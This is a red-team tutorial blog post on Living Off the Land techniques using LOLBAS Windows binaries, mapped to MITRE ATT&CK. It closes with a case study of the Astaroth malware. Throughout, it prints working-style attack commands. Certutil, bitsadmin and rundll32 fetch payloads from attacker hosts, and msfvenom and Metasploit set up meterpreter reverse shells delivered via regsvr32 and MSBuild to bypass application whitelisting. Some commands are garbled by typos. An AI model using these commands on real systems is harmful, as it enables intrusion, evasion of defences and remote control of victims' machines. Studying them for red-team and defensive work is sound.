---
layout: post
title: "Stealth with LOLBAS: Living Off the Land (LOTL) Techniques in Red Teaming"
date: 2025-08-26
categories: [Red Team,Malware Development,Malware Analysis,Blue Team,LOTL,LOLBAS]
image: https://cdn-images-1.medium.com/max/800/1*15gFAZAWtcufSSqBVCBpCg.jpeg
---

**Living Off the Land** is a trending term in the red team community. The name is taken from real-life, living by eating the available food on the land. Similarly, adversaries and malware creators take advantage of a target computer’s built-in tools and utilities. The term **Living Off the Land** was introduced at **DerbyCon3** in 2013 and has gained more traction in the red team community ever since, becoming an often used and popular technique.

These built-in tools perform various regular activities within the target system or network capabilities; however, they are increasingly used and abused, for example, using the **CertUtil** tool to download malicious files into the target machine.

The primary idea is to use Microsoft-signed programs, scripts, and libraries to blend in and evade defensive controls. Red teamers do not want to get detected when executing their engagement activities on the target, so utilizing these tools is safer to maintain their stealth.

The following are some categories that Living Off the Land encompasses:

1\. Reconnaissance

2\. Files operations

3\. Arbitrary code execution

4\. Lateral movement

5\. Security product bypass

**Learning objectives**

• Learn about the term **Living Off the Land** of red team engagements.

• Learn about the LOLBAS project and how to use it.

• Understand and apply the techniques used in red teaming engagements.

**What is Windows Sysinternals?**

Windows Sysinternals is a set of tools and advanced system utilities developed to help IT professionals manage, troubleshoot, and diagnose the Windows operating system in various advanced topics.

Sysinternals Suite is divided into various categories, including:

· Disk management

· Process management Networking tools

· System information

· Security tools

In order to use the Windows Sysinternals tools, we need to accept the Microsoft license agreement of these tools. We can do this by passing the -**accepteula** argument at the command prompt or by GUI during tool execution.

The following are some popular Windows Sysinternals tools:

**AccessChk**: Helps system administrators check specified access for files, directories, Registry keys, global objects, and Windows services.

**PsExec**: A tool that executes programs on a remote system.

**ADExplorer**: An advanced Active Directory tool that helps to easily view and manage the AD database.

**ProcDump**: Monitors running processes for CPU spikes and the ability to dump memory for further analysis.

**ProcMon**: An essential tool for process monitoring.

**TCPView:** A tool that lists all TCP and UDP connections.

**PsTools:** The first tool designed in the Sysinternals suite to help list detailed information.

**Portmon:** Monitors and displays all serial and parallel port activity on a system.

**Whois**: Provides information for a specified domain name or IP address

**Red Team utilization and benefits**

While built-in and Sysinternals tools are helpful for system administrators, these tools are also used by hackers, malware, and pentesters due to the inherent trust they have within the operating system. This trust is beneficial to Red teamers, who do not want to get detected or caught by any security control on the target system. Therefore, these tools have been used to evade detection and other blue team controls.

Remember that due to the increase of adversaries and malware creators using these tools nowadays, the blue team is aware of the malicious usage and has implemented defensive controls against most of them.

- - -

#### **LOLBAS Project**

LOLBAS stands for **Living Off the Land Binaries And Scripts**, a project’s primary main goal is to gather and document the Microsoft- signed and built-in tools used as Living Off the Land techniques, including binaries, scripts, and libraries.

![](https://cdn-images-1.medium.com/max/800/1*DiSVk9zdLPPYkQGPYp3IXw.png)

The LOLBAS project is a community-driven repository gathering a collection of binaries, scripts, libraries that could be used for red team purposes. It allows to search based on binaries, functions, scripts, and ATT&CK info. The previous image shows what the LOLBAS project page looks like at this time. If you are interested in more details about the project, you may visit the project’s website here. The LOLBAS website provides a convenient search bar to query all available data. It is straightforward to look for a binary, including the binary name will show the result. However, if we want to look for a specific function, we require providing a / before the function name. For example, if we are looking for all execute functions, we should use **/execute**. Similarly, in order to look based on types, we should use the symbol followed by the type name. The following are the types included in the project:

• Script

• Binary

• Libraries

· OtherMSBinaries

**Tools Criteria**

Specific criteria are required for a tool to be a “Living Off the Land” technique and accepted as part of the LOLBAS project:

• Microsoft-signed file native to the OS or downloaded from Microsoft.

• Having additional interesting unintended functionality not covered by known use cases.

• Benefits an APT (Advanced Persistent Threat) or Red Team engagement.

Please note that if you find an exciting binary that adheres to the previously mentioned criteria, you may submit your finding by visiting the GitHub repo contribution page for more information.

**Interesting Functionalities**

The LOLBAS project accepts tool submissions that fit one of the following functionalities:

· Aribitrary code Execution

· File Operations, including downloading, Uploading, and copying files

· Compiling code

· Persistence, including hiding data in Alternate Data Streams (ADS) or executing at logon

· UAC Bypass

· Dumping process memory

· DLL injection

- - -

#### **File Operations**

This section shows commonly used tools based on functionalities and malware activities seen in the real world as well as in red team engagements.

This section will highlight some interesting “Living Off the Land” techniques that aim to be used in file operations, including download, upload, and encoding.

**Certutil**

Certutil is a Windows built-in utility for handling certification services. It is used to dump and display Certification Authority (CA) configuration information and other CA components. Therefore, the tool’s normal use is to retrieve certificate information. However, people found that certutil.exe could transfer and encode files unrelated to certification services. The MITRE ATT&CK framework identifies this technique as **Ingress tool transfer** (**T1105**).

To illustrate this with an example, we can use **certutil.exe** to download a file from an attacker’s web server and store it in the Windows temporary folder, using the command below. Note that we use the **-urlcache**, **-split**, and **-f** parameters to force the tool to download from the provided URL using the split technique.

Command:

> **certutil -URLcache -split -f** [http://Attacker_IP/payload.exe](http://Attacker_IP/payload.exe) **C:\Windows\Temp\payload.exe**

**-urlcache** to display the URL and enables the URL option to use in the command.

**-split -f** to split and force fetching files from the provided URL.

Also, **certutil.exe** can be used as an encoding tool where we can encode files and decode the content of files. ATT&CK T1027 refers to this technique to obfuscate files to make them difficult to discover or analyze.

> **certutil -encode payload.exe Encoded-payload.txt**

For more information about the tool, you may visit the Microsoft Documentation.

**BITSAdmin**

The **bitsadmin** tool is a system administrator utility that can be used to create, download, or upload Background Intelligent Transfer Service (BITS) jobs and check their progress. BITS is a low-bandwidth and asynchronous method to download and upload files from HTTP web servers and SMB servers. Additional information about the bitsadmin tool can be found at Microsoft Docs. Attackers may abuse BITS jobs to download and execute a malicious payload on a compromised machine. For more information about this technique, you may visit the ATT&CK **T1197 page**.

> **bitsadmin.exe /transfer /Download /priority Foreground Attacker_IP/Payload.exe**
> **payload.exe**

**/Transfer** to use the transfer option.

**/Download** specifies transfer using the download type.

**/Priority** sets the priority of the job to be running in the foreground.

For more information about the **bitsadmin** parameters, you can visit the Microsoft documentation of the tool.

**FindStr**

**Findstr** is a Microsoft built-in tool used to find text and string patterns in files. The findstr tool is useful in helping users and system administrators search within files or parsed output. For example, if we want to check whether port 8080 is open on our machine, we can pipe the result of netstat to find that port as follows: `netstat –an | findstr “445”`.

However, an unintended way was found by using **findstr.exe** to download remote files from SMB shared folders within the network as follows:

> **findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\windows\Temp\test.exe**

**/V** to print out the lines that don’t contain the string provided.

**dummystring** the text to be searched for; in this case, we provide a string that must not be found in a file.

**> c:\windows\Temp\test.exe** redirects the output to a file on the target machine.

Note that other tools can be used for the file operation. We suggest visiting the LOLBAS project to check them out.

#### **File Execution**

This task shows various ways of executing a binary within the operating system. The typical case of executing a binary involves various known methods such as using the command line **cmd.exe** or from the desktop. However, other ways exist to achieve payload execution by abusing other system binaries, of which one of the reasons is to hide or harden the payload’s process. Based on the MITRE ATT&CK framework, this technique is called **Signed Binary Proxy Execution** or **Indirect Command Execution**, where the attacker leverages other system tools to spawn malicious payloads. This technique also helps to evade defensive controls.

File Explorer is a file manager and system component for Windows. People found that using the file explorer binary can execute other .**exe** files. This technique is called **Indirect Command Execution,** where the **explorer.exe** tool can be used and abused to launch malicious scripts or executables from a trusted parent process.

The **explorer.exe** binary is located at:

• C:\\Windows\\explorer.exe for the Windows 32 bits version

• C:\\Windows\\SysWOW64\\explorer.exe for the Windows 64 bits version

In order to create a child process of **explorer.exe** parent, we can execute the following command:

> **explorer.exe /root, “C:\\Windows\\System32\\calc.exe”**

**WMIC**

Windows Management Instrumentation (WMIC) is a Windows command-line utility that manages Windows components. People found that WMIC is also used to execute binaries for evading defensive measures. The MITRE ATT&CK framework refers to this technique as Signed Binary Proxy Execution (**T1218**)

> **wmic.exe process call create calc**

> **Executing (Win32\_Process)->Create()**

> **Method execution successful.**

> **Out Parameters:**

> **instance of PARAMETERS**

> **{**

> **ProcessId 1740;**

> **ReturnValue = 0;**

> **};**

The previous **WMIC** command creates a new process of a binary of our choice, which in this case **calc**.**exe**.

**Rundll32**

Rundll32 is a Microsoft built-in tool that loads and runs Dynamic Link Library DLL files within the operating system. A red team can abuse and leverage **rund1132.ex**e to run arbitrary payloads and execute JavaScript and PowerShell scripts. The MITRE ATT&CK framework identifies this as **Signed Binary Proxy Execution:** **Rundll32** and refers to it as **T1218.**

The **rund1132.exe** binary is located at:

• C:\\Windows\\System32\\rundll32.exe for the Windows 32 bits version

• C:\\Windows\\SysWOW64\\rundll32.exe for the Windows 64 bits version

Now let’s try to execute a **calc.exe** binary as proof of concept using the **rund1132**.exe binary:

> **rundll32.exe javascript:”\\..\\mshtml.d11, RunHTMLApplication “; eval(“w-new ActiveXObject(\\”WScript.Shell\\”);w.run(\\”calc\\”); window.close()”);**

In the previous command, we used the **rund1132**.**exe** binary that embeds a JavaScript component, **eval**(), to execute the **calc.exe** binary, a Microsoft calculator.

As we mentioned previously, we can also execute PowerShell scripts using the rund1132.exe. The following command runs a JavaScript that executes a PowerShell script to download from a remote website using rund1132.exe.

> **rundll32.exe javascript:”\\..\\mshtml, RunHTMLApplication “;document.write(); new%20ActiveXObject(“WScript.Shell”).Run(“powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(‘http://AttackBox\_IP/script.ps1');");**

As a result of the previous execution, a copy of the **script.ps1** downloaded into memory on the target machine.

- - -

#### **Bypassing Application Whitelisting**

Application Whitelisting is a Microsoft endpoint security feature that prevents malicious and unauthorized programs from executing in real-time. Application whitelisting is rule-based, where it specifies a list of approved applications or executable files that are allowed to be present and executed on an operating system. This task focuses on LOLBAS examples that are used to bypass the Windows application whitelisting.

**Regsvr32**

Regsvr32 is a Microsoft command-line tool to register and unregister Dynamic Link Libraries (DLLs) in the Windows Registry. The regsvr.exe binary is located at:

• C:\\Windows\\System32\\regsvr32.exe for the Windows 32 bits version

• C:\\Windows\\SysWOW64\\regsvr32.exe for the Windows 64 bits version

Besides its intended use, regsvr32.exe binary can also be used to execute arbitrary binaries and bypass the Windows Application Whitelisting. According to **Red Canary reports**, the **regsvr32.exe** binary is the third most popular ATT&CK technique. Adversaries leverage **regsvr32.exe** to execute native code or scripts locally or remotely. The technique used in the **regsvr32.exe** uses trusted Windows OS components and is executed in memory, which is one of the reasons why this technique is also used to bypass application whitelisting.

Let’s try to apply this technique in real life. First, we need to create a malicious DLL file using **msfvenom** and set up our **Metasploit** listener to receive a reverse shell. Note that we will be creating a malicious file that works for 32bit operating systems. We will be using the regsvr32.exe Application Whitelisting Bypass technique to run a command on a target system.

> **user@machine$ msfvenom -p windows/meterpreter/reverse\_tcp LHOST tune LPORT 443 -f dll -a x86 liveofftheland.dll**

> **Payload size: 375 bytes**

> **Final size of dll file: 8704 bytes**

> **user@machine$ user@machine$ msfconsole -q**

> **msf6 > use exploit/multi/handler**

> **\[\*\] Using configured payload generic/shell\_reverse\_tcp**

> **msf6 exploit (multi/handler) > set payload windows/meterpreter/reverse\_tcp**

> **payload => windows/meterpreter/reverse\_tcp**

> **msf6 exploit (multi/handler) > set LHOST ATTACKBOX\_IP**

> **LHOST => ATTACKBOX\_IP**

> **msf6 exploit (multi/handler) > set LPORT 443**

> **LPORT -> 443**

> **msf6 exploit (multi/handler) > exploit**

> **\[\*\] Started reverse TCP handler on ATTACKBOX\_IP:443**

Note that we specified the output type as DLL using the **\-f** argument. Once the malicious DLL file is generated, we need to deliver the payload to the victim machine. We will do this by using a webserver to serve the DLL file on our attacking machine as follows,

> **user@machine$ python3 -m http.server 1337**

From the victim machine, visit the webserver of the attacking machine on port 1337 that we specify. Note that this port can be changed with your choice!

On the victim machine, once the file DLL file is downloaded, we execute it using **regsvr32.exe** as follows,

> **c:\\Windows\\System32\\regsvr32.exe c:\\Users\\test\\Downloads\\live@fftheland.dll**

> **or**

> **C:\\Users\\test> c:\\Windows\\System32\\regsvr32.exe /s /n /u/i:http://example.com/file.sct**

> **Downloads\\liveofftheland.dll**

With the second option, which is a more advanced command, we instruct the regsvr32.exe to run:

**/s**: in silent mode (without showing messages)

**/n**: to not call the DLL register server

**/i**: to use another server since we used /n

**/u**: to run with unregister method

On the attacking machine, we should receive a reverse shell.

> **msf6 > exploit (multi/handler) > exploit**

> **\[\*\] Started reverse TCP handler on ATTACKBOX\_IP:443**

> **\[\*\] Sending stage (175174 bytes) to 10.10.159.197**

> **\[\*\] Meterpreter session 1 opened (ATTACKBOX\_IP: 443 -> 10.10.159.197:52845) at 2022–01–20 05:51:31 -0600**

Note if we wanted to create a 64-bit DLL version, we need to specify it in the msfvenom command and run it from the victim machine using the 64bits version of regsvr32.exe at **C:\\Windows\\SysWOW64\\regsvr32.exe.**

**Bourne Again Shell (Bash)**

In 2016, Microsoft added support for the Linux environment on Windows 10,11, and Server 2019. This feature is known as Windows Subsystem for Linux (**WSL**), and it exists in two WSL versions: WSL1 and WSL2. WSL is a Hyper-V virtualized Linux distribution that runs on the operating system, supporting a subset of the Linux kernel and system calls. This feature is an addon that a user can install and interact with a Linux distribution. As part of WSL, **bash.exe** is a Microsoft tool for interacting with the Linux environment.

People found ways to execute payloads and bypass the Windows application whitelisting since it is a Microsoft signed binary. By executing **bash.exe -c “path-to-payload”,** we can execute any unsigned payload. ATT&CK called this an **Indirect Command execution** technique where attackers abuse the Windows tools utility to obtain command executions. For more information about this technique, you may visit the T1202 ATT&CK website.

- - -

#### **Other Techniques**

This section highlights a couple of interesting techniques used, whether for initial access or persistence. The following techniques belong to the Living Off the Land umbrella since they can be used as part of the Windows environment utilities.

**Shortcuts**

Shortcuts or symbolic links are a technique used for referring to other files or applications within the operating system. Once a user clicks on the shortcut file, the reference file or application is executed. Often, the Red team leverages this technique to gain initial access, privilege escalation, or persistence. The MITRE ATT&CK framework calls this Shortcut modification technique **T1547**, where an attacker creates or modifies a shortcut in order to take advantage of this technique.

To use the shortcut modification technique, we can set the target section to execute files using:

· Rundll32

· Powershell

· Regsvr32

· Executable on disk

the attacker can modify the Excel target section to execute a binary using **rundll32.exe**. We choose to execute a calculator instead of running the Excel application. Once the victim clicks on the Excel shortcut icon, the calc.exe is executed.

**No PowerShell!**

In 2019, Red Canary published a threat detection report stating that PowerShell is the most used technique for malicious activities. Therefore, Organizations started to monitor or block powershell.exe from being executed. As a result, adversaries find other ways to run PowerShell code without spawning it.

**PowerLessShell** is a Python-based tool that generates malicious code to run on a target machine without showing an instance of the PowerShell process. PowerLessShell relies on abusing the Microsoft Build Engine (**MSBuild**), a platform for building Windows applications, to execute remote code.

First, let’s download a copy of the project from the GitHub repo

> **user@machines: git clone PowerlessShell.git**

One of the project requirements is to get a PowerShell payload to make it suitable to work with MSBuild. On the AttackBox, we need to generate a PowerShell payload using msfvenom as follows:

> **user@machines: msfvenom -p windows/meterpreter/reverse\_winhttps LHOST AttackBox\_IP LPORT 4443 -f psh-reflection liveff.ps1**

Also, we need to run the Metasploit framework to listen and wait for the reverse shell.

Terminal

> **user@machines msfconsole -q -x “use exploit/multi/handler; set payload windows/meterpreter/reverse\_winhttps; set lhost AttackBox\_IP; set 1port 4443; exploit**

> **\[\*\] Using configured payload generic/shell\_reverse\_tcp**

> **payload => windows/meterpreter/reverse\_winhttps**

> **lhost -> AttackBox\_IP 1port > 4443**


Now that we have the payload ready, change to the **PowerLessShell** directory project to convert the payload to be compatible with the MSBuild tool. Then run the PowerLessShell tool and set the source file to the one we created with msfvenom as follows:

> **user@machines python2 PowerlessShell.py -type powershell -source /tmp/liveff.ps1 -output liveff.csproj**

Once the command is executed successfully, we need to transfer the output file to the Windows machine. You can do this using the **SCP** command or set a web server to host the file on the AttackBox (**python3 — http.server 1337)** and download the file using the browser.

Finally, on the target Windows machine, build the **.csproj** file and wait for the reverse shell!

> **C:\\Windows\\Microsoft.NET\\framework\\v4.0.3019\\MSBuild.exe c:\\users\\test\\Desktop\\liveoff.csproj**

- - -

#### **Real-life Scenario**

This section introduces a showcase of malware that used the techniques discussed in this article. In 2017, The Windows Defender Advanced Threat Protection (**Windows Defender ATP**) Research Team discovered **Fileless** malware named **Astaroth**. A fileless malware means that the malware runs and is executed in the system without writing to disk. The malware performs all its functions from the victim device’s memory.

**Astaroth** is known as an information stealer, which takes sensitive information from victim users, such as account credentials, keystrokes, and other data, and sends it to the attacker. The malware relies on various advanced techniques such as **anti-debugging, anti-virtualization, anti-emulation tricks, process hollowing, NTFS Alternate Data Streams (ADS), and Living off the land binaries** to perform different functions.

· In the initial access stage, attackers rely on a spam campaign that contains malicious attachment files. The attached file is an **LNK** file shortcut that, once the victim has clicked it, will result in the following:

· WMIC command is executed to download and run **Javascript** code.

· Abusing the **BITSadmin** to download multiple binaries from the command and control server. Interestingly, in some cases, the malware uses YouTube channel descriptions to hide their C2 server commands.

· Using the **BITSadmin**, ADS technique, to hide their binaries within the system for their persistence.

· A **Certutil** tool is used to decode a couple of downloaded payloads into DLL files.

· The DLL files are executed using **Regsvr32**.

For more details about the malware and the detections, we suggest checking the following references:

**1\. Astaroth: Banking Trojan**

**2\. Microsoft Discovers Fileless Malware Campaign Dropping Astaroth Info Stealer**

**3\. Astaroth malware hides command servers in YouTube channel descriptions**

By [Moataz Osama](https://medium.com/@mezo512) on [July 15, 2025](https://medium.com/p/028b15ae8fb8).

[Canonical link](https://medium.com/@mezo512/stealth-with-lolbas-living-off-the-land-lotl-techniques-in-red-teaming-028b15ae8fb8)

Exported from [Medium](https://medium.com) on August 26, 2025.